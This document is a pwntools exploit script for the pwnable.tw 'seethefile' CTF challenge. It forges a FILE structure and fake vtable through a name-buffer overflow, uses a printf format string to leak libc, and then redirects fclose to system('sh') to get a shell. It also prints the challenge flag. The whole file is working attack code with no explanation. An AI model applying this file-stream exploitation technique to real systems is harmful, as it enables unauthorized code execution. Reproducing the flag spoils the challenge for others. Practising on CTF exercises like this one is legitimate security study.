#!/usr/bin/env python3

from pwn import *

exe = ELF("./seethefile_patched", checksec = False)
libc = ELF("./libc_32.so.6", checksec = False)
ld = ELF("./ld-2.23.so", checksec = False)

context.binary = exe


def conn():
    if args.REMOTE:
        r = remote("chall.pwnable.tw", 10200)
    else:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    return r

r = conn()
def openfile(filename):
    r.sendlineafter(b'Your choice :', b'1')
    r.sendlineafter(b'What do you want to see :', filename)
def readfile():
    r.sendlineafter(b'Your choice :', b'2')
def writefile():
    r.sendlineafter(b'Your choice :', b'3')
def closefile():
    r.sendlineafter(b'Your choice :', b'4')
def exit(name):
    r.sendlineafter(b'Your choice :', b'5')
    r.sendlineafter(b'Leave your name :', name)
# Leak libc
input()
openfile(b'/etc/passwd')

# info('fclose plt: ' + hex(exe.got['fclose']))
fp = 0x804b280
name = 0x804b260
magicbuf = 0x804b0c0
fclose_got = exe.got['fclose']
fake_vtables = 0x804b500
print_plt = exe.plt['printf']
init = 0x80484b0
main = exe.sym['main']
info('Main address: ' + hex(main))
info('Printf address: ' + hex(print_plt))

payload = b'A'*0x20 + p32(fp + 0x10) + p32(0)*3
payload += b'%7$x' + p32(fclose_got) + p32(fclose_got + 400) + p32(fclose_got)
# Overwrite to _lock
payload += p32(0)*14 + p32(magicbuf) + p32(0)*18 + p32(fp + 0x10 + 148 + 4) + p32(0)*2 + p32(init)*6
payload += p32(print_plt) + p32(init)*8 + p32(main) + p32(init)*3
exit(payload)
# pause()
readfile()
pause()
libc_leak = int(r.recv(8), 16)
info("Libc leak: " + hex(libc_leak))
libc.address = libc_leak - 0x5ddc7
info("Libc address: " + hex(libc.address))
system = libc.sym['system']
pause()
payload = b'A'*0x20 + p32(fp + 0x10) + p32(0)*3
payload += b'sh\0\0' + p32(fclose_got) + p32(fclose_got + 400) + p32(fclose_got)
# Overwrite to _lock
payload += p32(0)*14 + p32(magicbuf) + p32(0)*18 + p32(fp + 0x10 + 148 + 4) + p32(0)*2 + p32(init)*6
payload += p32(print_plt) + p32(init)*8 + p32(system) + p32(init)*3

exit(payload)
# # good luck pwning :)
# r.sendline(b'cd /home/seethefile')
# r.sendline(b'./get_flag')
# r.sendlineafter(b'Your magic :', b'Give me the flag')
# FLAG{F1l3_Str34m_is_4w3s0m3}

r.interactive()

